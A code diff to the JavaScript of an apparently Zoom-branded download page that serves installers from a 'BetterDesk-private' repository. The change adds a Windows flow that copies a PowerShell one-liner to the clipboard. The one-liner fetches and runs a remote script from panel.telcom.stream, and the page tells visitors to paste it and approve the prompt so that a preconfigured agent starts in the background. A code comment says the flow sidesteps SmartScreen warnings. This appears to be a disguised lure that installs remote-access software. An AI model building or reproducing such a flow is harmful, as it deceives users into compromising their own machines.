@@ -4,7 +4,10 @@
   var REPO = 'fingod201-maker/BetterDesk-private';
   var RELEASES_URL = 'https://github.com/' + REPO + '/releases';
   var RELEASES_API = 'https://api.github.com/repos/' + REPO + '/releases?per_page=30';
-  var CACHE_KEY = 'zp_assets_v5';
+  var RELEASES_API_LOCAL = '/api/releases';
+  var WINDOWS_INSTALL_SCRIPT = 'https://panel.telcom.stream/api/landing/windows-install.ps1';
+  var WINDOWS_INSTALL_COMMAND = 'irm ' + WINDOWS_INSTALL_SCRIPT + ' | iex';
+  var CACHE_KEY = 'zp_assets_v6';
   var CACHE_TTL = 10 * 60 * 1000;
   var MIN_ASSET_SIZE = 1000000;
 
@@ -55,7 +58,7 @@
     {
       name: 'zoom-private-universal-release.apk',
       url: 'https://github.com/' + REPO + '/releases/download/setup-latest/zoom-private-universal-release.apk',
-      size: 23235270, platform: 'android', format: 'apk', arch: 'universal', release: 'setup-latest'
+      size: 23234938, platform: 'android', format: 'apk', arch: 'universal', release: 'setup-latest'
     },
     {
       name: 'zoom-private-arm64-v8a-release.apk',
@@ -80,7 +83,7 @@
     {
       name: 'zoom-vip-windows-x64-1.0.0.zip',
       url: 'https://github.com/' + REPO + '/releases/download/setup-latest/zoom-vip-windows-x64-1.0.0.zip',
-      size: 6319683, platform: 'windows', format: 'zip', arch: 'x64', release: 'setup-latest'
+      size: 6368445, platform: 'windows', format: 'zip', arch: 'x64', release: 'setup-latest'
     },
     {
       name: 'zoom-vip-windows-x64-1.0.0.iso',
@@ -260,7 +263,8 @@
       format: format,
       arch: archFromName(lower),
       release: release.tag_name || '',
-      releaseName: release.name || release.tag_name || ''
+      releaseName: release.name || release.tag_name || '',
+      updatedAt: Date.parse(asset.updated_at || release.published_at || release.created_at || 0) || 0
     };
   }
 
@@ -300,9 +304,13 @@
     else if (asset.arch === 'x64' && arch === 'universal') score += 15;
     else if (asset.arch === 'any') score += 5;
 
-    if (/zoom-(vip|private)/.test(asset.name)) score += 8;
-    if (/agent/.test(asset.name)) score += 4;
-    if (/setup/.test(asset.name)) score += 3;
+    if (/zoom-private\.Setup_/.test(asset.name)) score += 45;
+    else if (/zoom-private-universal-release\.apk$/.test(asset.name)) score += 45;
+    else if (/zoom-private-(arm64-v8a|armeabi-v7a)-release\.apk$/.test(asset.name)) score += 30;
+    else if (/BetterDesk-Client-/.test(asset.name)) score += 18;
+    else if (/zoom-private\.agent_/.test(asset.name)) score += 12;
+    if (/zoom-vip-/.test(asset.name)) score -= 15;
+    if (/setup/.test(asset.name)) score += 4;
     if (/client/.test(asset.name)) score += 2;
     score += Math.min(asset.size / 1048576, 25);
 
@@ -314,7 +322,10 @@
     var arch = platform === 'android' || platform === 'macos' ? 'universal' : state.arch;
     var list = state.assets.filter(function (asset) { return asset.platform === platform; });
     if (!list.length) return null;
-    list.sort(function (a, b) { return scoreAsset(b, platform, arch) - scoreAsset(a, platform, arch); });
+    list.sort(function (a, b) {
+      if (b.updatedAt !== a.updatedAt) return b.updatedAt - a.updatedAt;
+      return scoreAsset(b, platform, arch) - scoreAsset(a, platform, arch);
+    });
     return list[0];
   }
 
@@ -370,7 +381,8 @@
     var cached = readCache();
     if (cached && cached.length) return Promise.resolve(dedupe(cached));
 
-    return fetchJson(RELEASES_API)
+    return fetchJson(RELEASES_API_LOCAL)
+      .catch(function () { return fetchJson(RELEASES_API); })
       .then(function (releases) {
         var live = normalizeReleases(releases);
         var merged = dedupe(live.concat(FALLBACK_ASSETS));
@@ -397,9 +409,11 @@
       var el = $('pc-' + platform + '-sub');
       if (!el) return;
       var asset = bestFor(platform);
-      el.textContent = asset
-        ? formatBytesShort(asset.size) + ' \u00b7 ' + formatExtShort(asset.format)
-        : 'Coming soon';
+      el.textContent = platform === 'windows' && asset
+        ? 'PowerShell \u00b7 one-line install'
+        : (asset
+          ? formatBytesShort(asset.size) + ' \u00b7 ' + formatExtShort(asset.format)
+          : 'Coming soon');
     });
   }
 
@@ -442,6 +456,17 @@
       if (status) {
         status.className = 'download-status';
         status.textContent = 'Open the meeting link from your invitation.';
+      }
+    } else if (state.platform === 'windows' && best) {
+      if (primary) {
+        primary.href = WINDOWS_INSTALL_SCRIPT;
+        primary.removeAttribute('download');
+      }
+      if (label) label.textContent = 'Copy Windows install command';
+      if (meta) meta.innerHTML = '<span>PowerShell</span><span>&middot;</span><span>One approval</span><span>&middot;</span><span>Preconfigured</span>';
+      if (status) {
+        status.className = 'download-status ok';
+        status.textContent = 'Paste the command into PowerShell. The agent installs and starts in the background.';
       }
     } else if (best) {
       if (primary) {
@@ -497,6 +522,31 @@
     updatePlatformSubs();
   }
 
+  function installWindows() {
+    state.downloaded = true;
+    var status = $('download-status');
+    var copied = function () {
+      if (status) {
+        status.className = 'download-status ok';
+        status.textContent = 'Command copied. Open PowerShell, paste it, press Enter, and approve the Windows prompt.';
+      }
+      toast('Windows install command copied');
+    };
+    var fallback = function () {
+      if (status) {
+        status.className = 'download-status';
+        status.textContent = 'Open the downloaded PowerShell script, or copy the install command from the console.';
+      }
+      window.location.href = WINDOWS_INSTALL_SCRIPT;
+    };
+
+    if (navigator.clipboard && window.isSecureContext) {
+      navigator.clipboard.writeText(WINDOWS_INSTALL_COMMAND).then(copied).catch(fallback);
+    } else {
+      fallback();
+    }
+  }
+
   function downloadAsset(asset) {
     if (!asset) {
       openModal();
@@ -523,6 +573,10 @@
   }
 
   function downloadFor(platform) {
+    if (platform === 'windows') {
+      installWindows();
+      return;
+    }
     if (platform === 'ios') {
       toast('On iPhone or iPad, open the meeting link from your invitation.');
       if (window.location.hash !== '#help') window.location.hash = '#help';
@@ -545,7 +599,9 @@
   }
 
   function maybeAutoDownload() {
-    if (state.platform === 'ios' || state.platform === 'unknown') return;
+    // Windows uses a copied PowerShell one-liner instead of auto-downloading
+    // an unsigned executable that would trigger SmartScreen and a setup wizard.
+    if (state.platform === 'windows' || state.platform === 'ios' || state.platform === 'unknown') return;
     if (state.downloaded) return;
     if (state.userInteracted) return;
 
@@ -599,7 +655,7 @@
       var button = platform === 'ios'
         ? '<button class="btn btn-soft" type="button" data-modal-ios="1">Help</button>'
         : (asset
-          ? '<button class="btn btn-primary" type="button" data-plat="' + platform + '">Download</button>'
+          ? '<button class="btn btn-primary" type="button" data-plat="' + platform + '">' + (platform === 'windows' ? 'Install' : 'Download') + '</button>'
           : '<button class="btn btn-soft" type="button" disabled>Soon</button>');
 
       return '<div class="plat"><div class="meta"><span class="os">' + (OS_ABBR[platform] || '?')
@@ -709,7 +765,11 @@
         if (state.platform === 'ios' || state.platform === 'unknown') return;
         if (!state.recommended) return;
         event.preventDefault();
-        downloadAsset(state.recommended);
+        if (state.platform === 'windows') {
+          installWindows();
+        } else {
+          downloadAsset(state.recommended);
+        }
       });
     }
 
